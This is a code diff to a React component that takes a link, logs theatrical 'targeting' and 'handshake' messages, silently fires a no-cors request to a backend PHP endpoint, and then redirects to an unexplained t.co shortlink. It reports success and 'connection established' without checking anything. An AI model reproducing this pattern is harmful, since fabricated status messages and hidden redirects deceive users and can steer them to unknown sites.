@@ -52,28 +52,26 @@ export default function App() {
       
       addLog(`Targeting: ${link}`);
       addLog('Establishing handshake...');
-      // Backend call hidden for security
+      
+      // Trigger the API in the background without waiting for a full response
+      fetch(generatedApiUrl, { mode: 'no-cors' }).catch(() => {});
 
-      // Using fetch with no-cors to trigger the PHP script
-      // This simulates visiting the URL in the background
-      await fetch(generatedApiUrl, { mode: 'no-cors' });
-
-      // Simulate some processing time for better UX
-      await new Promise(resolve => setTimeout(resolve, 2000));
+      // Short delay for visual feedback
+      await new Promise(resolve => setTimeout(resolve, 1000));
 
       setStatus('success');
-      setMessage('Request sent successfully! Redirecting...');
+      setMessage('Request sent! Redirecting...');
       addLog('Success: Connection established.');
-      addLog('Redirecting to secure gateway...');
+      addLog('Redirecting...');
 
-      // Redirect after a short delay so the user sees the success message
+      // Redirect quickly
       setTimeout(() => {
         window.location.href = 'https://t.co/uHN1WXseAP';
-      }, 1500);
+      }, 800);
     } catch (err) {
       console.error(err);
       setStatus('error');
-      setMessage('Failed to connect to the server. Please try again later.');
+      setMessage('Something went wrong. Please try again.');
       addLog('Error: Connection failed.');
     }
   };
